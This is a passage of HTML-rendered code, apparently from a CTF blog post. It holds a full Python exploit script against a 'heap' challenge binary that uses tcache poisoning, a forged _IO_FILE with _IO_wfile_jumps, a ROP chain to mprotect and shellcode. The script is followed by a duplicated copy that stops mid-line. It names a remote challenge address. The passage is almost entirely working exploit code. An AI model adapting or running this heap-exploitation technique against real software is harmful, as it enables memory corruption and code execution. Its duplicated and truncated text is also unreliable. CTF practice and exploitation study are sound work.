class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 22620&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.31/libio</span></span><br><span class="line"><span class="string">    b *$rebase(0x17C9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x18B9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1973)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1A30)</span></span><br><span class="line"><span class="string">    b wgenops.c:371</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充数据以确保其长度是16的倍数</span></span><br><span class="line">    data = pad(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的加密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密数据</span></span><br><span class="line">    encrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>):</span><br><span class="line">        encrypted_data += cipher.encrypt(data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的解密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    decrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">16</span>):</span><br><span class="line">        decrypted_data += cipher.decrypt(encrypted_data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除填充</span></span><br><span class="line">    <span class="comment"># decrypted_data = unpad(decrypted_data, 16)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">code_base = u64_ex(r(<span class="number">6</span>)) - <span class="number">0x1BF0</span></span><br><span class="line">set_current_code_base_and_log(code_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">log_ex(data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">key = <span class="string">b&#x27;\x51\x88\xc6\x47\x4b\x22\x8c\xbd\xd2\x42\xe9\x12\x5e\xbe\x1d\x53&#x27;</span></span><br><span class="line">log_ex(<span class="string">f&quot;key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x200</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>, key))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64_ex(heap_base + <span class="number">0x330</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x20CD1</span>), key))  <span class="comment"># any</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">15</span> - i, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x13</span> - <span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x31</span>), key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x511</span>), key))</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x41</span>), key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x60</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    dele(<span class="number">15</span>)</span><br><span class="line">    edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, p64_ex(libc.sym._IO_list_all - <span class="number">0x18</span>))</span><br><span class="line">edit(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = heap_base + <span class="number">0x10</span></span><br><span class="line">_IO_wfile_jumps = libc.sym._IO_wfile_jumps</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: u64_ex(<span class="string">&quot;  sh&quot;</span>),</span><br><span class="line">        <span class="number">0x8</span>: libc_base + <span class="number">0x000000000002F70A</span>,  <span class="comment">#: pop rsp; ret;</span></span><br><span class="line">        <span class="number">0x10</span>: heap_base + <span class="number">0x300</span>,</span><br><span class="line">        <span class="number">0x28</span>: <span class="number">0xB81</span>,  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">        <span class="number">0xA0</span>: fake_IO_FILE + <span class="number">0xE8</span> - <span class="number">0xE0</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        <span class="number">0xD8</span>: _IO_wfile_jumps,  <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0xE0</span>: libc_base + <span class="number">0x5B4D0</span>,  <span class="comment"># function</span></span><br><span class="line">        <span class="number">0xE8</span>: fake_IO_FILE + <span class="number">0xE0</span> - <span class="number">0x68</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">1</span>, decrypt(payload[<span class="number">0xA0</span> : <span class="number">0xA0</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">2</span>, decrypt(payload[<span class="number">0xA0</span> + <span class="number">0x30</span> : <span class="number">0xA0</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line">rdi = CG.pop_rdi_ret()</span><br><span class="line">rsi = CG.pop_rsi_ret()</span><br><span class="line">rdx_rbx = CG.pop_rdx_rbx_ret()</span><br><span class="line"></span><br><span class="line">payload = flat([rdi, heap_base, rsi, <span class="number">0x2000</span>, rdx_rbx, <span class="number">7</span>, <span class="number">0</span>, libc.sym.mprotect, heap_base + <span class="number">0x360</span>]).ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">0</span>, heap_base + <span class="number">0x360</span>, <span class="number">0x1000</span>))</span><br><span class="line">payload = pad(payload, <span class="number">16</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">4</span>, decrypt(payload[<span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">5</span>, decrypt(payload[<span class="number">0x30</span> + <span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x30</span> + ShellcodeMall.amd64.cat_flag)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 22620&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.31/libio</span></span><br><span class="line"><span class="string">    b *$rebase(0x17C9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x18B9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1973)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1A30)</span></span><br><span class="line"><span class="string">    b wgenops.c:371</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 